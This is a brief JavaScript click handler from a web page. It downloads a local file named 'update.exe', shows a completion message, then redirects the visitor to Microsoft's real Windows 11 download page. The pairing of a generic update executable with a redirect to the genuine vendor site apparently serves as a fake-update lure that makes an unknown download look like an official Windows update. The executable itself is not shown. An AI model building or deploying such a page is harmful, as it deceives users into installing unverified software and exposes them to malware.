document.getElementById('downloadBtn').addEventListener('click', function() {
const button = this;
button.textContent = 'Downloading...';
button.disabled = true;
button.style.opacity = '0.7';
const link = document.createElement('a');
link.href = 'update.exe';
link.download = 'update.exe';
document.body.appendChild(link);
link.click();
document.body.removeChild(link);
setTimeout(function() {
button.textContent = 'Download Complete!';
button.style.background = 'linear-gradient(135deg, #28a745 0%, #20c997 100%)';
setTimeout(function() {
window.location.href = 'https://www.microsoft.com/en-us/software-download/windows11';
}, 1500);
}, 500);
});
